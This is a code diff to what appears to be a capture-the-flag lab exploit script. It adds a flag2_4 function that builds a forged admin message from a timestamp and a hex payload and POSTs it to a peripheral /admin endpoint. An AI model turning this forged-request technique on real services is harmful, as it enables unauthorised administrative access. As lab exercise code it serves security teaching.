@@ -63,6 +63,27 @@ def flag2_3():
     except ConnectionError:
         print("ERROR: An error occurred")
 
+def flag2_4():
+    cleanUp()
+    P, E = setup()
+    # Exploit
+    ts = str(int(time.time()*1000))+"$00"
+    assert len(ts) == 16
+    msg = f'admin$0000000000{ts}467bf17e91612440c0fb0cddb42e19631f675a7b0920f5434606e389667d074111111111111111111111110f1b130556af4a445d5bfee31c1fba656aefb089f10c026c75fc10bd6d5e501e435ca2061f7439810809ab69fa140077db71232044a31b010f6e405c086e499e0dc87d758ddfb7a4bc563719c11e063b744f5f91f9a375400ed9802b8f8bbce92701cea5e08cbb695293a6fe76bf77e9493ad8eab1'
+    assert len(msg) == 352
+    headers = {
+        'Content-Type': 'application/xml',
+        'Content-Length': '352'
+        }
+    try:
+        rep = requests.post(f"{peripheral_uri}/admin", data=msg, headers=headers)
+        if rep.status_code == 200:
+            print(f"P req returned {rep.text}")
+        else:
+            print(f"P got {rep}")
+    except ConnectionError:
+        print("ERROR: An error occurred")
+
 def flag2_2():
     cleanUp()
     P, E = setup(with_catching=False)
@@ -119,12 +140,11 @@ def flag2_1():
             print("ERROR: An error occurred")
 
 def main():
-    #cleanUp()
-    #P, E = setup(with_catching=False)
-    # Exploit
     flag2_1()
     flag2_2()
     flag2_3()
+    flag2_4()
+    sleep(1)
 
 if __name__ == "__main__":
     cleanUp()
